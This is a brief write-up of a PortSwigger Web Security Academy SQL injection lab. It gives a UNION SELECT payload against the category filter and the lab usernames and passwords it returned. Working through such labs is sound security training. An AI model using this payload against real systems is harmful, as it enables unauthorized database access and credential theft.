# Lab

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

## Payload

```sql
/filter?category=Accessories' UNION SELECT username, password FROM users--
```

### Results

```
administrator, tycp2xjyn4p5zl5utyrr
carlos, lgpp3i42qmylqqqv5ko3
wiener, u64414tq10dsmhro6rt3
```